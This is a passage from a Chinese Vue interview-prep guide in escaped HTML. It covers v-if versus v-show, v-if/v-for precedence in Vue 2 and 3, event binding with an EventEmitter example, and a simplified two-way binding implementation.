面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>权限页把“删除用户”按钮写成 <code>v-show=&quot;canDelete&quot;</code>，测试发现无权限用户仍能在 <code>DOM</code> 中找到它，这算实现正确吗？</strong></p>\\n<p>若要求敏感节点不出现在 <code>DOM</code> 中，<code>v-show</code> 不满足约束，因为它只切换 <code>display</code>，元素和监听仍然存在。应使用 <code>v-if</code> 控制节点是否创建，但前端隐藏不能替代服务端鉴权，否则接口仍可能被直接调用。</p>\\n</li>\\n<li>\\n<p><strong>运营后台的筛选抽屉每分钟开关几十次，内部组件初始化较重但状态允许常驻，你会选 <code>v-if</code> 还是 <code>v-show</code>？</strong></p>\\n<p>更适合 <code>v-show</code>，它承担一次初始渲染成本，之后只修改元素的 <code>display</code>，不会反复销毁和重建子组件及监听器。代价是抽屉即使长期关闭也占用 <code>DOM</code> 和相关资源，若多数用户从不打开则未必划算。</p>\\n</li>\\n<li>\\n<p><strong>报表页有二十个图表面板，只有用户点击后才会首次展示，而且会话中通常只打开一个，为什么不应一律使用 <code>v-show</code>？</strong></p>\\n<p><code>v-show</code> 无论初始条件真假都会渲染全部面板，可能把二十个图表的初始化成本压到首屏。<code>v-if</code> 在条件为假时不创建条件块，更符合按需展示；若之后频繁切换，则要接受重复挂载和卸载的成本。</p>\\n</li>\\n<li>\\n<p><strong>表单弹窗由 <code>v-if</code> 控制，用户关闭再打开后输入内容丢失，组件的创建和销毁钩子也重复执行，你会先查哪里？</strong></p>\\n<p>先确认关闭动作是否让条件从真变假，因为 <code>v-if</code> 会卸载节点、事件监听和子组件，再次为真时重新创建。若产品要求保留输入状态，可把数据提升到外部，或在可接受常驻成本时改用 <code>v-show</code>；单纯改指令可能增加初始负担。</p>\\n</li>\\n<li>\\n<p><strong>同一套设置面板在桌面端高频折叠、移动端只在首次引导中出现一次，组件负责人坚持两端共用一种隐藏策略，你怎么取舍？</strong></p>\\n<p>两端不必强行统一：桌面端高频切换更偏向 <code>v-show</code>，移动端低频且初始不需要渲染时更偏向 <code>v-if</code>。选择依据是初始渲染成本与切换成本的分布，而不是语法偏好；仍应结合面板体量验证资源占用。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_20-v-if和v-for哪个优先级更高\\"><a class=\\"header-anchor\\" href=\\"#_20-v-if和v-for哪个优先级更高\\">#</a> 20 v-if和v-for哪个优先级更高</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><strong><code>Vue 2</code>：<code>v-for</code> 优先级更高</strong> —— 每一项都会执行一次 <code>v-if</code> 判断，即使大部分会被过滤掉</li>\\n<li><strong><code>Vue 3</code>：<code>v-if</code> 优先级更高</strong> —— 此时 <code>v-if</code> 里访问 <code>v-for</code> 的迭代变量会直接报错</li>\\n<li>两个版本行为相反，说明这种写法本身就有歧义，<strong>官方风格指南明确禁止同时使用</strong></li>\\n<li>正确做法一：用 <code>computed</code> 先过滤好数据再遍历（性能最好，还能缓存）</li>\\n<li>正确做法二：把 <code>v-if</code> 提到外层 <code>&lt;template&gt;</code> 上（用于&quot;整个列表要不要渲染&quot;的判断）</li>\\n</ul>\\n<p><strong><code>Vue 2</code> 中 <code>v-for</code> 优先级更高，而 <code>Vue 3</code> 中 <code>v-if</code> 优先级更高，但都不建议写在同一个元素上。</strong> 在 <code>Vue 2</code> 里会先遍历再判断，过滤少量数据也要走完整个列表；在 <code>Vue 3</code> 里先执行 <code>v-if</code>，此时循环变量可能尚不存在。过滤列表时应先用计算属性得到目标数据，再执行 <code>v-for</code>。如果是控制整个列表是否显示，就把 <code>v-if</code> 放到容器或外层 <code>template</code> 上。</p>\\n</section>\\n<ul>\\n<li>实践中不应该把<code>v-for</code>和<code>v-if</code>放一起</li>\\n<li>在<code>vue2</code>中，<code>v-for</code>的优先级是高于<code>v-if</code>，把它们放在一起，输出的渲染函数中可以看出会先执行循环再判断条件，哪怕我们只渲染列表中一小部分元素，也得在每次重渲染的时候遍历整个列表，这会比较浪费；另外需要注意的是在<code>vue3</code>中则完全相反，<code>v-if</code>的优先级高于<code>v-for</code>，所以<code>v-if</code>执行时，它调用的变量还不存在，就会导致异常</li>\\n<li>通常有两种情况下导致我们这样做：\\n<ul>\\n<li>为了过滤列表中的项目 (比如 <code>v-for=&quot;user in users&quot; v-if=&quot;user.isActive&quot;</code>)。此时定义一个计算属性 (比如 <code>activeUsers</code>)，让其返回过滤后的列表即可（比如<code>users.filter(u=&gt;u.isActive)</code>）</li>\\n<li>为了避免渲染本应该被隐藏的列表 (比如 <code>v-for=&quot;user in users&quot; v-if=&quot;shouldShowUsers&quot;</code>)。此时把 <code>v-if</code> 移动至容器元素上 (比如 <code>ul</code>、<code>ol</code>)或者外面包一层<code>template</code>即可</li>\\n</ul>\\n</li>\\n<li>文档中明确指出永远不要把 <code>v-if</code> 和 <code>v-for</code> 同时用在同一个元素上，显然这是一个重要的注意事项</li>\\n<li>源码里面关于代码生成的部分，能够清晰的看到是先处理<code>v-if</code>还是<code>v-for</code>，顺序上<code>vue2</code>和<code>vue3</code>正好相反，因此产生了一些症状的不同，但是不管怎样都是不能把它们写在一起的</li>\\n</ul>\\n<p><strong>vue2.x源码分析</strong></p>\\n<blockquote>\\n<p>在vue模板编译的时候，会将指令系统转化成可执行的<code>render</code>函数</p>\\n</blockquote>\\n<p>编写一个<code>p</code>标签，同时使用<code>v-if</code>与 <code>v-for</code></p>\\n<pre class=\\"language-html\\"><code>&lt;div id=&quot;app&quot;&gt;\\n  &lt;p v-if=&quot;isShow&quot; v-for=&quot;item in items&quot;&gt;\\n    {{ item.title }}\\n  &lt;/p&gt;\\n&lt;/div&gt;\\n</code></pre>\\n<p>创建<code>vue</code>实例，存放<code>isShow</code>与<code>items</code>数据</p>\\n<pre class=\\"language-js\\"><code>const app = new Vue({\\n  el: &quot;#app&quot;,\\n  data() {\\n    return {\\n      items: [\\n        { title: &quot;foo&quot; },\\n        { title: &quot;baz&quot; }]\\n    }\\n  },\\n  computed: {\\n    isShow() {\\n      return this.items &amp;&amp; this.items.length &gt; 0\\n    }\\n  }\\n})\\n</code></pre>\\n<p>模板指令的代码都会生成在<code>render</code>函数中，通过<code>app.$options.render</code>就能得到渲染函数</p>\\n<pre class=\\"language-js\\"><code>ƒ anonymous() {\\n  with (this) { return \\n    _c(&#39;div&#39;, { attrs: { &quot;id&quot;: &quot;app&quot; } }, \\n    _l((items), function (item) \\n    { return (isShow) ? _c(&#39;p&#39;, [_v(&quot;\\\\n&quot; + _s(item.title) + &quot;\\\\n&quot;)]) : _e() }), 0) }\\n}\\n</code></pre>\\n<ul>\\n<li><code>_l</code>是<code>vue</code>的列表渲染函数，函数内部都会进行一次<code>if</code>判断</li>\\n<li>初步得到结论：<code>v-for</code>优先级是比<code>v-i</code>f高</li>\\n<li>再将<code>v-for</code>与<code>v-if</code>置于不同标签</li>\\n</ul>\\n<pre class=\\"language-html\\"><code>&lt;div id=&quot;app&quot;&gt;\\n  &lt;template v-if=&quot;isShow&quot;&gt;\\n    &lt;p v-for=&quot;item in items&quot;&gt;{{item.title}}&lt;/p&gt;\\n  &lt;/template&gt;\\n&lt;/div&gt;\\n</code></pre>\\n<p>再输出下<code>render</code>函数</p>\\n<pre class=\\"language-js\\"><code>ƒ anonymous() {\\n  with(this){return \\n    _c(&#39;div&#39;,{attrs:{&quot;id&quot;:&quot;app&quot;}},\\n    [(isShow)?[_v(&quot;\\\\n&quot;),\\n    _l((items),function(item){return _c(&#39;p&#39;,[_v(_s(item.title))])})]:_e()],2)}\\n}\\n</code></pre>\\n<p>这时候我们可以看到，<code>v-for</code>与<code>v-if</code>作用在不同标签时候，是先进行判断，再进行列表的渲染</p>\\n<p>我们再在查看下vue源码</p>\\n<p>源码位置：<code>\\\\vue-dev\\\\src\\\\compiler\\\\codegen\\\\index.js</code></p>\\n<pre class=\\"language-js\\"><code>export function genElement (el: ASTElement, state: CodegenState): string {\\n  if (el.parent) {\\n    el.pre = el.pre || el.parent.pre\\n  }\\n  if (el.staticRoot &amp;&amp; !el.staticProcessed) {\\n    return genStatic(el, state)\\n  } else if (el.once &amp;&amp; !el.onceProcessed) {\\n    return genOnce(el, state)\\n  } else if (el.for &amp;&amp; !el.forProcessed) {\\n    return genFor(el, state)\\n  } else if (el.if &amp;&amp; !el.ifProcessed) {\\n    return genIf(el, state)\\n  } else if (el.tag === &#39;template&#39; &amp;&amp; !el.slotTarget &amp;&amp; !state.pre) {\\n    return genChildren(el, state) || &#39;void 0&#39;\\n  } else if (el.tag === &#39;slot&#39;) {\\n    return genSlot(el, state)\\n  } else {\\n    // component or element\\n    ...\\n}\\n</code></pre>\\n<p>在进行<code>if</code>判断的时候，<code>v-for</code>是比<code>v-if</code>先进行判断</p>\\n<p>最终结论：<code>v-for</code>优先级比<code>v-if</code>高</p>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>用户列表写成 <code>&lt;li v-for=&quot;user in users&quot; v-if=&quot;user.active&quot;&gt;</code>，从 <code>Vue 2</code> 迁移到 <code>Vue 3</code> 后提示 <code>user</code> 不存在，为什么原代码会暴露问题？</strong></p>\\n<p><code>Vue 3</code> 中同一元素上的 <code>v-if</code> 优先于 <code>v-for</code>，判断执行时迭代变量 <code>user</code> 尚未建立，因此会异常。应改为遍历计算属性 <code>activeUsers</code>；这也消除了同一节点上两条结构指令的语义冲突。</p>\\n</li>\\n<li>\\n<p><strong>客服后台有五千条会话，只显示 <code>online</code> 项；团队在 <code>Vue 2</code> 中用同节点的 <code>v-for</code> 和 <code>v-if</code>，每次重渲染都变慢，你会怎样改？</strong></p>\\n<p>定义缓存的计算属性，例如 <code>onlineSessions = sessions.filter(...)</code>，模板只遍历过滤结果。<code>Vue 2</code> 会先执行 <code>v-for</code> 再逐项判断 <code>v-if</code>，因此原写法每次渲染仍遍历全量列表；若源数组频繁整体变化，过滤计算本身仍有成本。</p>\\n</li>\\n<li>\\n<p><strong>导航菜单只有 <code>hasPermission</code> 为真时才需要渲染整组二百个条目，却把 <code>v-if=&quot;hasPermission&quot;</code> 写在每个循环项上，怎样调整结构？</strong></p>\\n<p>把 <code>v-if</code> 移到外层容器或包裹循环的 <code>&lt;template&gt;</code> 上，让权限判断先决定是否生成整组列表。这样条件为假时不会进入列表渲染；若权限因条目而异，则应改为预先过滤，不能把组级判断机械套用到项级规则。</p>\\n</li>\\n<li>\\n<p><strong>线上空白页只出现在 <code>Vue 3</code>，模板中有 <code>&lt;tr v-for=&quot;row in rows&quot; v-if=&quot;row.visible&quot;&gt;</code>，接口数据正常，你的排查顺序是什么？</strong></p>\\n<p>先查看编译或运行错误是否指向 <code>row</code> 未定义，再搜索同元素同时使用 <code>v-if</code>、<code>v-for</code> 的位置。确认后将可见行提取为计算属性，或让 <code>&lt;template v-for&gt;</code> 与内部条件节点分层；不要靠调整属性书写顺序修复，优先级不由书写顺序决定。</p>\\n</li>\\n<li>\\n<p><strong>代码评审中，一方主张用 <code>computed</code> 过滤列表，另一方主张在 <code>v-for</code> 内放 <code>&lt;template v-if&gt;</code>，对于频繁重渲染的大列表怎么选？</strong></p>\\n<p>优先考虑 <code>computed</code>，过滤结果只在依赖变化时重新计算，模板也更清晰。内层 <code>&lt;template v-if&gt;</code> 能解决作用域和指令冲突，但每次渲染仍需遍历并逐项判断；当判断依赖渲染期上下文、难以预计算时才更适合后者。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_21-vue的事件绑定原理\\"><a class=\\"header-anchor\\" href=\\"#_21-vue的事件绑定原理\\">#</a> 21 Vue的事件绑定原理</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>分两种：<strong>原生 <code>DOM</code> 事件</strong>（普通元素上的 <code>@click</code>）和<strong>组件自定义事件</strong>（组件上的 <code>@xxx</code>）</li>\\n<li>原生事件：编译成 <code>addEventListener</code>，在 <code>patch</code> 的 <code>create</code>/<code>update</code> 钩子里绑定和更新</li>\\n<li>组件事件：走的是组件实例自己的事件中心（<code>$on</code>/<code>$emit</code>），本质是发布订阅，<strong>和 <code>DOM</code> 无关</strong></li>\\n<li>组件上想绑原生事件要加 <code>.native</code>（<code>Vue 2</code>）；<code>Vue 3</code> 移除了它，改用 <code>emits</code> 声明 + 透传 <code>attrs</code></li>\\n<li><code>Vue</code> 没有做全局事件委托，每个绑定都是真实的监听器 —— 超长列表仍需自己考虑委托</li>\\n</ul>\\n<p><strong><code>Vue</code> 的事件绑定分为原生 <code>DOM</code> 事件和组件自定义事件，两者走的不是同一套机制。</strong> 普通元素上的事件最终通过 <code>addEventListener</code> 绑定到真实节点，并在创建或更新节点时维护监听器。组件事件则通过 <code>$on</code> 和 <code>$emit</code> 实现，本质上是按事件名管理监听函数的发布订阅。以 <code>Vue 2</code> 为例，如果要监听组件根元素的原生事件，需要使用 <code>.native</code> 修饰符。</p>\\n</section>\\n<blockquote>\\n<p>原生事件绑定是通过 <code>addEventListener</code> 绑定给真实元素的，组件事件绑定是通过 <code>Vue</code> 自定义的<code>$on</code> 实现的。如果要在组件上使用原生事件，需要加<code>.native</code> 修饰符，这样就相当于在父组件中把子组件当做普通 <code>html</code> 标签，然后加上原生事件。</p>\\n</blockquote>\\n<p><code>$on</code>、<code>$emit</code> 是基于发布订阅模式的，维护一个事件中心，<code>on</code> 的时候将事件按名称存在事件中心里，称之为订阅者，然后 <code>emit</code> 将对应的事件进行发布，去执行事件中心里的对应的监听器</p>\\n<p><strong>EventEmitter(发布订阅模式--简单版)</strong></p>\\n<pre class=\\"language-js\\"><code>// 手写发布订阅模式 EventEmitter\\nclass EventEmitter {\\n  constructor() {\\n    this.events = {};\\n  }\\n  // 实现订阅\\n  on(type, callBack) {\\n    if (!this.events) this.events = Object.create(null);\\n\\n    if (!this.events[type]) {\\n      this.events[type] = [callBack];\\n    } else {\\n      this.events[type].push(callBack);\\n    }\\n  }\\n  // 删除订阅\\n  off(type, callBack) {\\n    if (!this.events[type]) return;\\n    this.events[type] = this.events[type].filter(item =&gt; {\\n      return item !== callBack;\\n    });\\n  }\\n  // 只执行一次订阅事件\\n  once(type, callBack) {\\n    function fn() {\\n      callBack();\\n      this.off(type, fn);\\n    }\\n    this.on(type, fn);\\n  }\\n  // 触发事件\\n  emit(type, ...rest) {\\n    this.events[type] &amp;&amp; this.events[type].forEach(fn =&gt; fn.apply(this, rest));\\n  }\\n}\\n\\n\\n// 使用如下\\nconst event = new EventEmitter();\\n\\nconst handle = (...rest) =&gt; {\\n  console.log(rest);\\n};\\n\\nevent.on(&quot;click&quot;, handle);\\n\\nevent.emit(&quot;click&quot;, 1, 2, 3, 4);\\n\\nevent.off(&quot;click&quot;, handle);\\n\\nevent.emit(&quot;click&quot;, 1, 2);\\n\\nevent.once(&quot;dbClick&quot;, () =&gt; {\\n  console.log(123456);\\n});\\nevent.emit(&quot;dbClick&quot;);\\nevent.emit(&quot;dbClick&quot;);\\n</code></pre>\\n<p><strong>源码分析</strong></p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/e0f6b652df9a5418.png\\" alt=\\"\\"></p>\\n<ol>\\n<li>原生 dom 的绑定</li>\\n</ol>\\n<ul>\\n<li><code>Vue</code> 在创建真是 <code>dom</code> 时会调用 <code>createElm</code> ,默认会调用 <code>invokeCreateHooks</code></li>\\n<li>会遍历当前平台下相对的属性处理代码,其中就有 <code>updateDOMListeners</code> 方法,内部会传入 <code>add</code> 方法</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>function updateDOMListeners (oldVnode: VNodeWithData, vnode: VNodeWithData) { \\n    if (isUndef(oldVnode.data.on) &amp;&amp; isUndef(vnode.data.on)) { \\n        return \\n    }\\n    const on = vnode.data.on || {} \\n    const oldOn = oldVnode.data.on || {} \\n    target = vnode.elm normalizeEvents(on) \\n    updateListeners(on, oldOn, add, remove, createOnceHandler, vnode.context) \\n    target = undefined \\n}\\nfunction add ( name: string, handler: Function, capture: boolean, passive: boolean ) {\\n    target.addEventListener( // 给当前的dom添加事件 \\n        name, \\n        handler, \\n        supportsPassive ? { capture, passive } : capture \\n    ) \\n}\\n</code></pre>\\n<blockquote>\\n<p><code>vue</code> 中绑定事件是直接绑定给真实 <code>dom</code> 元素的</p>\\n</blockquote>\\n<ol start=\\"2\\">\\n<li>组件中绑定事件</li>\\n</ol>\\n<pre class=\\"language-js\\"><code>export function updateComponentListeners ( vm: Component, listeners: Object, oldListeners: ?Object ) {\\n    target = vm updateListeners(listeners, oldListeners || {}, add, remove, createOnceHandler, vm)\\n    target = undefined \\n}\\nfunction add (event, fn) { \\n    target.$on(event, fn) \\n}\\n</code></pre>\\n<blockquote>\\n<p>组件绑定事件是通过 <code>vue</code> 中自定义的 <code>$on</code> 方法来实现的</p>\\n</blockquote>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>详情页在原生 <code>&lt;button&gt;</code> 和自定义 <code>&lt;ActionButton&gt;</code> 上都写了 <code>@click</code>，前者触发、后者无反应；在 <code>Vue 2</code> 的事件模型里差异在哪里？</strong></p>\\n<p>原生元素的监听最终通过 <code>addEventListener</code> 绑定到真实 <code>DOM</code>，而组件上的 <code>@click</code> 默认订阅组件事件，等待子组件 <code>$emit(\'click\')</code>。若确实要监听组件根节点的原生点击可用 <code>.native</code>，但封装组件时显式发出语义事件通常更稳妥。</p>\\n</li>\\n<li>\\n<p><strong>消息列表一次渲染一千行，每行都有 <code>@click</code>，负责人认为 <code>Vue</code> 会自动把监听委托到父容器，这个判断有源码依据吗？</strong></p>\\n<p>没有，原生 <code>DOM</code> 事件由更新监听模块调用 <code>addEventListener</code> 绑定到对应真实元素，并非自动集中到列表容器。若监听数量成为瓶颈，需要业务自行做事件委托；同时应评估列表是否该一次渲染一千行，避免只优化事件而忽略 <code>DOM</code> 规模。</p>\\n</li>\\n<li>\\n<p><strong>子组件执行 <code>$emit(\'save\', payload)</code> 后，父组件注册的两个 <code>@save</code> 处理函数都运行了；为什么这不是 <code>DOM</code> 冒泡？</strong></p>\\n<p>组件事件由 <code>$on</code>、<code>$emit</code> 维护的发布订阅中心分发，<code>emit</code> 会按事件名执行已登记的监听器。它不依赖真实 <code>DOM</code> 的捕获或冒泡路径，因此不能用 <code>stopPropagation</code> 推断组件事件行为；跨层通信还需另行设计。</p>\\n</li>\\n<li>\\n<p><strong>弹窗反复打开后一次 <code>$emit(\'confirm\')</code> 导致提交接口调用三次，你会围绕事件系统检查哪些位置？</strong></p>\\n<p>优先检查每次打开时是否重复执行 <code>$on(\'confirm\', handler)</code>，关闭时却没有用 <code>$off</code> 移除同一处理函数。发布订阅中心会保留同名订阅并逐个执行，重复注册就会重复提交；若回调只允许执行一次，可使用 <code>$once</code>，但它不能掩盖生命周期管理错误。</p>\\n</li>\\n<li>\\n<p><strong>组件库评审中，一方想让所有组件都暴露原生 <code>click</code>，另一方希望只发 <code>confirm</code>、<code>cancel</code> 等业务事件，你会怎样划分？</strong></p>\\n<p>通用按钮可以围绕点击语义发出组件事件，复杂弹窗则更适合暴露 <code>confirm</code>、<code>cancel</code> 等稳定契约，由内部 <code>$emit</code> 发布。直接依赖根 <code>DOM</code> 原生事件会让调用方耦合组件结构；抽象过度也可能丢失必要交互，需要按组件职责确定边界。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_22-vue-是如何实现数据双向绑定的\\"><a class=\\"header-anchor\\" href=\\"#_22-vue-是如何实现数据双向绑定的\\">#</a> 22 Vue 是如何实现数据双向绑定的</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>&quot;双向绑定&quot;是<strong>数据劫持 + 发布订阅</strong>的组合，不是一个单独的机制</li>\\n<li>数据 → 视图：响应式系统（<code>defineProperty</code>/<code>Proxy</code> 劫持 → <code>Dep</code> 收集 → <code>notify</code> 触发重渲染）</li>\\n<li>视图 → 数据：<code>v-model</code> 语法糖 —— 监听 <code>input</code> 事件把新值写回 <code>data</code></li>\\n<li>所以真正的双向只发生在 <code>v-model</code> 上，其余都是单向的数据流</li>\\n<li><code>Vue 3</code> 组件上的 <code>v-model</code> 是 <code>:modelValue</code> + <code>@update:modelValue</code>，支持多个 <code>v-model:xxx</code></li>\\n</ul>\\n<p><strong><code>Vue</code> 的双向绑定，本质上是响应式更新视图，再由事件监听把视图变化写回数据。</strong> 数据初始化时，<code>Observer</code> 通过 <code>Object.defineProperty</code> 劫持属性，读取时由 <code>Dep</code> 收集 <code>Watcher</code>，修改时再通知对应视图更新。模板编译阶段，<code>Compile</code> 会解析指令、初始化节点，并为动态数据建立更新关系。输入框这类场景还要监听用户输入并修改数据，所以数据到视图和视图到数据才能形成完整闭环。</p>\\n</section>\\n<p><code>Vue</code> 数据双向绑定主要是指：数据变化更新视图，视图变化更新数据，如下图所示：</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/195830df8ba5d910.png\\" alt=\\"\\"></p>\\n<ul>\\n<li>输入框内容变化时，<code>Data</code> 中的数据同步变化。即 <code>View =&gt; Data</code> 的变化。</li>\\n<li><code>Data</code> 中的数据变化时，文本节点的内容同步变化。即 <code>Data =&gt; View</code> 的变化</li>\\n</ul>\\n<p><strong>Vue 主要通过以下 4 个步骤来实现数据双向绑定的</strong></p>\\n<ul>\\n<li><strong>实现一个监听器 Observer</strong>：对数据对象进行遍历，包括子属性对象的属性，利用 <code>Object.defineProperty()</code> 对属性都加上 <code>setter</code> 和 <code>getter</code>。这样的话，给这个对象的某个值赋值，就会触发 <code>setter</code>，那么就能监听到了数据变化</li>\\n<li><strong>实现一个解析器 Compile</strong>：解析 <code>Vue</code> 模板指令，将模板中的变量都替换成数据，然后初始化渲染页面视图，并将每个指令对应的节点绑定更新函数，添加监听数据的订阅者，一旦数据有变动，收到通知，调用更新函数进行数据更新</li>\\n<li><strong>实现一个订阅者 Watcher</strong>：<code>Watcher</code> 订阅者是 <code>Observer</code> 和 <code>Compile</code> 之间通信的桥梁 ，主要的任务是订阅 <code>Observer</code> 中的属性值变化的消息，当收到属性值变化的消息时，触发解析器 <code>Compile</code> 中对应的更新函数</li>\\n<li><strong>实现一个订阅器 Dep</strong>：订阅器采用 发布-订阅 设计模式，用来收集订阅者 <code>Watcher</code>，对监听器 <code>Observer</code> 和 订阅者 <code>Watcher</code> 进行统一管理</li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/976bacb8910af5bd.png\\" alt=\\"\\"></p>\\n<p><strong>Vue 数据双向绑定原理图</strong></p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/aab95455d08d851d.png\\" alt=\\"\\"></p>\\n<h3 id=\\"双向绑定的原理是什么\\"><a class=\\"header-anchor\\" href=\\"#双向绑定的原理是什么\\">#</a> 双向绑定的原理是什么</h3>\\n<p>我们都知道 <code>Vue</code> 是数据双向绑定的框架，双向绑定由三个重要部分构成</p>\\n<ul>\\n<li>数据层（Model）：应用的数据及业务逻辑</li>\\n<li>视图层（View）：应用的展示效果，各类UI组件</li>\\n<li>业务逻辑层（ViewModel）：框架封装的核心，它负责将数据与视图关联起来</li>\\n</ul>\\n<p>而上面的这个分层的架构方案，可以用一个专业术语进行称呼：<code>MVVM</code>这里的控制层的核心功能便是 “数据双向绑定” 。自然，我们只需弄懂它是什么，便可以进一步了解数据绑定的原理</p>\\n<p><strong>理解ViewModel</strong></p>\\n<p>它的主要职责就是：</p>\\n<ul>\\n<li>数据变化后更新视图</li>\\n<li>视图变化后更新数据</li>\\n</ul>\\n<p>当然，它还有两个主要部分组成</p>\\n<ul>\\n<li>监听器（<code>Observer</code>）：对所有数据的属性进行监听</li>\\n<li>解析器（<code>Compiler</code>）：对每个元素节点的指令进行扫描跟解析,根据指令模板替换数据,以及绑定相应的更新函数</li>\\n</ul>\\n<h3 id=\\"实现双向绑定\\"><a class=\\"header-anchor\\" href=\\"#实现双向绑定\\">#</a> 实现双向绑定</h3>\\n<p>我们还是以<code>Vue</code>为例，先来看看<code>Vue</code>中的双向绑定流程是什么的</p>\\n<ol>\\n<li><code>new Vue()</code>首先执行初始化，对<code>data</code>执行响应化处理，这个过程发生<code>Observe</code>中</li>\\n<li>同时对模板执行编译，找到其中动态绑定的数据，从<code>data</code>中获取并初始化视图，这个过程发生在<code>Compile</code>中</li>\\n<li>同时定义⼀个更新函数和<code>Watcher</code>，将来对应数据变化时<code>Watcher</code>会调用更新函数</li>\\n<li>由于<code>data</code>的某个<code>key</code>在⼀个视图中可能出现多次，所以每个<code>key</code>都需要⼀个管家<code>Dep</code>来管理多个<code>Watcher</code></li>\\n<li>将来data中数据⼀旦发生变化，会首先找到对应的<code>Dep</code>，通知所有<code>Watcher</code>执行更新函数</li>\\n</ol>\\n<p>流程图如下：</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/60c6dfd81740142d.png\\" alt=\\"\\"></p>\\n<p>先来一个构造函数：执行初始化，对<code>data</code>执行响应化处理</p>\\n<pre class=\\"language-js\\"><code>class Vue {  \\n  constructor(options) {  \\n    this.$options = options;  \\n    this.$data = options.data;  \\n        \\n    // 对data选项做响应式处理  \\n    observe(this.$data);  \\n        \\n    // 代理data到vm上  \\n    proxy(this);  \\n        \\n    // 执行编译  \\n    new Compile(options.el, this);  \\n  }  \\n}  \\n</code></pre>\\n<p>对<code>data</code>选项执行响应化具体操作</p>\\n<pre class=\\"language-js\\"><code>function observe(obj) {  \\n  if (typeof obj !== &quot;object&quot; || obj == null) {  \\n    return;  \\n  }  \\n  new Observer(obj);  \\n}  \\n  \\nclass Observer {  \\n  constructor(value) {  \\n    this.value = value;  \\n    this.walk(value);  \\n  }  \\n  walk(obj) {  \\n    Object.keys(obj).forEach((key) =&gt; {  \\n      defineReactive(obj, key, obj[key]);  \\n    });  \\n  }  \\n}  \\n</code></pre>\\n<p><strong>编译<code>Compile</code></strong></p>\\n<p>对每个元素节点的指令进行扫描跟解析,根据指令模板替换数据,以及绑定相应的更新函数</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/c3c70111cc822594.png\\" alt=\\"\\"></p>\\n<pre class=\\"language-js\\"><code>class Compile {  \\n  constructor(el, vm) {  \\n    this.$vm = vm;  \\n    this.$el = document.querySelector(el);  // 获取dom  \\n    if (this.$el) {  \\n      this.compile(this.$el);  \\n    }  \\n  }  \\n  compile(el) {  \\n    const childNodes = el.childNodes;   \\n    Array.from(childNodes).forEach((node) =&gt; { // 遍历子元素  \\n      if (this.isElement(node)) {   // 判断是否为节点  \\n        console.log(&quot;编译元素&quot; + node.nodeName);  \\n      } else if (this.isInterpolation(node)) {  \\n        console.log(&quot;编译插值⽂本&quot; + node.textContent);  // 判断是否为插值文本 {{}}  \\n      }  \\n      if (node.childNodes &amp;&amp; node.childNodes.length &gt; 0) {  // 判断是否有子元素  \\n        this.compile(node);  // 对子元素进行递归遍历  \\n      }  \\n    });  \\n  }  \\n  isElement(node) {  \\n    return node.nodeType == 1;  \\n  }  \\n  isInterpolation(node) {  \\n    return node.nodeType == 3 &amp;&amp; /\\\\{\\\\{(.*)\\\\}\\\\}/.test(node.textContent);  \\n  }  \\n}  \\n</code></pre>\\n<p><strong>依赖收集</strong></p>\\n<p>视图中会用到<code>data</code>中某<code>key</code>，这称为依赖。同⼀个<code>key</code>可能出现多次，每次都需要收集出来用⼀个<code>Watcher</code>来维护它们，此过程称为依赖收集多个<code>Watcher</code>需要⼀个<code>Dep</code>来管理，需要更新时由<code>Dep</code>统⼀通知</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/ee371a7be5114436.png\\" alt=\\"\\"></p>\\n<p><strong>实现思路</strong></p>\\n<ol>\\n<li><code>defineReactive</code>时为每⼀个<code>key</code>创建⼀个<code>Dep</code>实例</li>\\n<li>初始化视图时读取某个<code>key</code>，例如<code>name1</code>，创建⼀个<code>watcher1</code></li>\\n<li>由于触发<code>name1</code>的<code>getter</code>方法，便将<code>watcher1</code>添加到<code>name1</code>对应的<code>Dep</code>中</li>\\n<li>当<code>name1</code>更新，<code>setter</code>触发时，便可通过对应<code>Dep</code>通知其管理所有<code>Watcher</code>更新</li>\\n</ol>\\n<pre class=\\"language-js\\"><code>// 负责更新视图  \\nclass Watcher {  \\n  constructor(vm, key, updater) {  \\n    this.vm = vm  \\n    this.key = key  \\n    this.updaterFn = updater  \\n  \\n    // 创建实例时，把当前实例指定到Dep.target静态属性上  \\n    Dep.target = this  \\n    // 读一下key，触发get  \\n    vm[key]  \\n    // 置空  \\n    Dep.target = null  \\n  }  \\n  \\n  // 未来执行dom更新函数，由dep调用的  \\n  update() {  \\n    this.updaterFn.call(this.vm, this.vm[this.key])  \\n  }  \\n}  \\n</code></pre>\\n<p><strong>声明<code>Dep</code></strong></p>\\n<pre class=\\"language-js\\"><code>class Dep {  \\n  constructor() {  \\n    this.deps = [];  // 依赖管理  \\n  }  \\n  addDep(dep) {  \\n    this.deps.push(dep);  \\n  }  \\n  notify() {   \\n    this.deps.forEach((dep) =&gt; dep.update());  \\n  }  \\n} \\n</code></pre>\\n<p><strong>创建<code>watcher</code>时触发<code>getter</code></strong></p>\\n<pre class=\\"language-js\\"><code>class Watcher {  \\n  constructor(vm, key, updateFn) {  \\n    Dep.target = this;  \\n    this.vm[this.key];  \\n    Dep.target = null;  \\n  }  \\n}  \\n</code></pre>\\n<p><strong>依赖收集，创建<code>Dep</code>实例</strong></p>\\n<pre class=\\"language-js\\"><code>function defineReactive(obj, key, val) {  \\n  this.observe(val);  